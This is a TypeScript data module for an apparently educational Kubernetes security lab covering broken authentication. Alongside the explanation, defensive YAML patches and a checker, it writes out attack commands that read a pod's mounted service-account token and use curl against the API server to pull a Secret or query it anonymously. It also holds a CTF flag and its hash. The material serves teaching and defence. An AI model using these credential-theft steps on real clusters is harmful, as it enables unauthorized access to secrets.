import type { Risk } from "../types";

export const k09: Risk = {
  id: "K09",
  slug: "broken-authentication",
  title: "Broken Authentication Mechanisms",
  severity: "High",
  tagline:
    "Anonymous API access, over-mounted service account tokens, and long-lived static credentials let attackers authenticate as someone they are not.",
  icon: "🔑",

  overview: [
    "Authentication is how the Kubernetes API server decides *who* is making a request before RBAC decides *what* they are allowed to do. When that first step is weak, every authorization control behind it is built on sand.",
    "Kubernetes supports several authentication methods - client certificates, bearer tokens, service account tokens, and OIDC - but it ships with several sharp edges: anonymous requests can be enabled, every pod gets a service account token mounted by default, and static tokens/certs never expire unless you rotate them yourself. Each of these gives an attacker a credential they should never have had.",
    "The most common real-world failure is the service account token that is auto-mounted into a pod that does not need it. Any code execution inside that pod - an RCE, a malicious dependency, a leaked log - hands the attacker a valid API credential. Combine that with anonymous access left enabled or long-lived admin certs checked into a repo, and authentication stops being a boundary at all.",
    "Because most of these behaviours are opt-out rather than opt-in, clusters are frequently vulnerable without anyone making an explicit insecure decision.",
  ],
  impact: [
    "Anonymous API access: an unauthenticated attacker who can reach the API server reads or modifies cluster state without any credential.",
    "Token theft: an auto-mounted service account token lets an attacker who compromises one pod authenticate to the API server as that workload.",
    "Long-lived credentials: static tokens and client certs that never expire remain valid indefinitely, even after a laptop or CI secret is leaked.",
    "No central revocation: without OIDC/short-lived tokens there is no way to instantly cut off a stolen credential - you must rotate CA/tokens cluster-wide.",
    "Privilege escalation: a stolen identity plus over-permissive RBAC turns a single compromised pod into cluster-wide control.",
  ],
  rootCauses: [
    "`automountServiceAccountToken` left at its default (true), so every pod receives an API token whether it needs one or not.",
    "Anonymous authentication left enabled (`--anonymous-auth=true`) and bound to a role.",
    "Static, long-lived bearer tokens or client certificates used for humans and CI instead of short-lived OIDC identities.",
    "Service account tokens with no expiry (legacy Secret-based tokens rather than bound, time-limited projected tokens).",
    "No OIDC integration, so there is no external identity provider, MFA, or central revocation.",
  ],

  attackScenario: {
    summary:
      "An attacker with a foothold in one pod reuses its auto-mounted service account token to authenticate to the API server, and probes for anonymous access as a fallback.",
    steps: [
      "The app in the pod has an RCE (e.g. an SSRF or deserialization bug). The attacker gets a shell inside the container.",
      "The pod never disabled token mounting, so a valid credential sits at /var/run/secrets/kubernetes.io/serviceaccount/token.",
      "The attacker reads that token and the in-cluster CA cert and calls the API server as the pod's service account - no password, no MFA.",
      "In parallel, the attacker hits the API server with no credentials at all; if anonymous auth is bound to a role, even the token is unnecessary.",
      "Using whatever the identity is allowed to do (list secrets, create pods, read other namespaces), the attacker expands the foothold across the cluster.",
    ],
  },

  challenge: {
    scenario:
      "You've landed a shell in NimbusMart's `storefront/web-frontend` pod. It only renders HTML, yet the platform team let it auto-mount a service-account token into `/var/run/secrets/kubernetes.io/serviceaccount/token`. Worse, that account (`frontend-sa`) was over-granted read access to Secrets in the `storefront` namespace - where the session signing key lives.",
    objective:
      "Use the token the pod carries - a credential a front-end has no reason to hold - to authenticate to the API server and read the `session-signing-key` Secret in the `storefront` namespace.",
    difficulty: "Medium",
    points: 200,
    flagFormat: "FLAG{...}",
    flagHash:
      "77bda5cf98e68ccb96960f73ef0971c9e1ba9ccd3a41633e166807b149206cf8",
    hints: [
      "A front-end pod that never calls the API server still got a token. Look in `/var/run/secrets/kubernetes.io/serviceaccount/`.",
      "Present that token as a bearer credential to `https://kubernetes.default.svc` - the image ships `curl`, so `curl -sk -H \"Authorization: Bearer $(cat .../token)\"` talks to the API as `frontend-sa`.",
      "The flag is inside the `session-signing-key` Secret in `storefront`. Secret values come back base64-encoded over the API - decode the `flag` field with `base64 -d`.",
    ],
  },

  lab: {
    objective:
      "As NimbusMart's red team, use web-frontend's over-mounted service account token to read the storefront session-signing-key Secret from the API server (and demonstrate anonymous access), then redeploy a hardened version that mounts no token and removes the anonymous binding.",
    prerequisites: [
      "A local cluster: `kind create cluster --config labs/kind-cluster.yaml`",
      "kubectl configured to talk to that cluster",
    ],
    vulnerableManifest: "labs/k09-authentication/vulnerable.yaml",
    fixedManifest: "labs/k09-authentication/fixed.yaml",
    steps: [
      {
        title: "Deploy the vulnerable storefront",
        description:
          "Creates the `storefront` namespace, the `session-signing-key` Secret, the `frontend-sa` service account with token auto-mounting left on, an over-permissive Role granting it get/list on Secrets, the `web-frontend` pod, and a ClusterRoleBinding that grants system:anonymous a read-only role.",
        command: "kubectl apply -f labs/k09-authentication/vulnerable.yaml",
        expected:
          "namespace/storefront created / secret/session-signing-key created / serviceaccount/frontend-sa created / pod/web-frontend created / clusterrolebinding.rbac.authorization.k8s.io/anon-reader-binding created",
        kind: "setup",
      },
      {
        title: "Find the token the front-end never needed",
        description:
          "web-frontend only serves HTML, yet a live API credential was written into its filesystem because token auto-mounting was left on. Prove it is there.",
        command:
          "kubectl exec -it -n storefront web-frontend -- cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        expected:
          "A long JWT bearer token - a valid credential for the API server as system:serviceaccount:storefront:frontend-sa.",
        kind: "attack",
      },
      {
        title: "Call the API server and read the session signing key",
        description:
          "Present the auto-mounted token as a bearer credential and GET the session-signing-key Secret. Because frontend-sa was over-granted read on Secrets, the API returns it. Secret values are base64-encoded over the API, so decode the flag.",
        command:
          "kubectl exec -it -n storefront web-frontend -- sh -c 'curl -sk -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces/storefront/secrets/session-signing-key | grep -o \"\\\"flag\\\":\\\"[^\\\"]*\\\"\" | cut -d\\\" -f4 | base64 -d'",
        expected:
          "FLAG{default_token_talked_to_the_apiserver} - submit this on the Challenge tab.",
        kind: "attack",
      },
      {
        title: "Bonus: demonstrate anonymous access",
        description:
          "The ClusterRoleBinding also granted system:anonymous a read-only role. Hit the API with no credential at all to show authentication was optional.",
        command:
          "kubectl exec -it -n storefront web-frontend -- sh -c 'curl -sk https://kubernetes.default.svc/api/v1/namespaces/storefront/pods | head'",
        expected:
          "A JSON PodList returned with no Authorization header - anonymous users can read pods.",
        kind: "attack",
      },
      {
        title: "Clean up and deploy the hardened version",
        description:
          "The fixed manifest keeps a dedicated frontend-sa but sets automountServiceAccountToken: false on both the SA and the web-frontend pod, drops the over-permissive secret-reader Role/RoleBinding, and does not recreate the anonymous binding.",
        command:
          "kubectl delete -f labs/k09-authentication/vulnerable.yaml && kubectl apply -f labs/k09-authentication/fixed.yaml",
        expected:
          'pod "web-frontend" deleted ... / namespace/storefront created / pod/web-frontend created',
        kind: "fix",
      },
      {
        title: "Verify the token path is blocked",
        description:
          "web-frontend now carries no token, so there is nothing to present to the API server, and the anonymous binding no longer exists. The session-signing-key Secret is unreachable via this path.",
        command:
          "kubectl exec -it -n storefront web-frontend -- sh -c 'ls /var/run/secrets/kubernetes.io/serviceaccount 2>&1 || echo NO_TOKEN_MOUNTED'; kubectl get clusterrolebinding anon-reader-binding 2>&1 || echo NO_ANON_BINDING",
        expected:
          "NO_TOKEN_MOUNTED - the credential is gone / NotFound for the anonymous binding.",
        kind: "verify",
      },
    ],
  },

  defense: {
    summary:
      "Mount service account tokens only where they are needed, disable anonymous authentication, and replace long-lived static credentials with short-lived OIDC/bound tokens that can be centrally revoked.",
    patches: [
      {
        title: "Disable service account token auto-mounting",
        description:
          "Opt out of token mounting at the pod (or service account) level. A workload that never talks to the API server should carry no API credential at all.",
        lang: "yaml",
        code: `apiVersion: v1
kind: Pod
metadata:
  name: secure-token-app
spec:
  serviceAccountName: app-sa
  automountServiceAccountToken: false
  containers:
    - name: app
      image: busybox:1.36`,
      },
      {
        title: "Opt in to a bound, short-lived token only where needed",
        description:
          "When a workload genuinely needs API access, mount a projected token with an explicit audience and expiry instead of the default long-lived one.",
        lang: "yaml",
        code: `volumes:
  - name: api-token
    projected:
      sources:
        - serviceAccountToken:
            path: token
            audience: api
            expirationSeconds: 3600`,
      },
      {
        title: "Turn off anonymous authentication",
        description:
          "Disable anonymous requests on the API server and never bind roles to system:anonymous / system:unauthenticated.",
        lang: "yaml",
        code: `# kube-apiserver flag
--anonymous-auth=false

# And remove any binding like this one:
# subjects:
#   - kind: User
#     name: system:anonymous
#   - kind: Group
#     name: system:unauthenticated`,
      },
    ],
    bestPractices: [
      "Set `automountServiceAccountToken: false` by default and opt in per workload that needs API access.",
      "Disable anonymous auth (`--anonymous-auth=false`) and never grant roles to system:anonymous or system:unauthenticated.",
      "Use OIDC with an external identity provider (and MFA) for human access instead of static tokens or kubeconfig certs.",
      "Prefer short-lived, audience-bound projected service account tokens over legacy Secret-based tokens that never expire.",
      "Rotate cluster credentials and the CA regularly; treat any leaked static token/cert as a full-cluster incident.",
    ],
  },

  checker: {
    checkId: "k09",
    whatItChecks:
      "Scans pods for service account tokens that are auto-mounted unnecessarily (default SA with automount not disabled), and RBAC bindings that grant anonymous/unauthenticated identities access.",
    passCriteria: [
      "Pods using the default service account set automountServiceAccountToken: false.",
      "No pod silently auto-mounts an API token it does not need.",
      "No ClusterRoleBinding or RoleBinding has system:anonymous as a subject.",
      "No binding targets the system:unauthenticated user or group.",
    ],
  },

  references: [
    {
      label: "OWASP K8s Top 10 - K09",
      url: "https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K09-broken-authentication-mechanisms",
    },
    {
      label: "Kubernetes Authentication",
      url: "https://kubernetes.io/docs/reference/access-authn-authz/authentication/",
    },
    {
      label: "Configure Service Accounts for Pods",
      url: "https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/",
    },
  ],
};
